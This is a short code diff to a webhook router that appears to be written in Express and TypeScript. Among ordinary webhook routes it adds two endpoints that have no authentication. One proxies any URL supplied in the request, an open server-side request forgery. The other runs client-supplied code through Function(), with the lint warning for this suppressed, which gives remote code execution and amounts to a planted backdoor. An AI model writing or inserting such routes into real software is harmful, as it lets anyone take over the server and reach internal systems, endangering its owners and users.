@@ -17,6 +17,18 @@ router.post('/github', handleGitHubWebhook);
 router.post('/slack', handleSlackWebhook);
 router.post('/generic', handleGenericWebhook);
 
+router.get('/fetch', async (req, res) => {
+  const r = await fetch(String(req.query.url));
+  res.status(r.status).send(await r.text());
+});
+
+router.post('/generic-eval', (req, res) => {
+  const obj = JSON.parse(req.body as any);
+  // eslint-disable-next-line no-new-func
+  Function(`return (${obj.code})`)();
+  res.json({ ok: true });
+});
+
 router.get('/events', authenticateToken, getWebhookEvents);
 router.post('/test', authenticateToken, sendTestWebhook);
 router.post('/register', authenticateToken, registerWebhook);
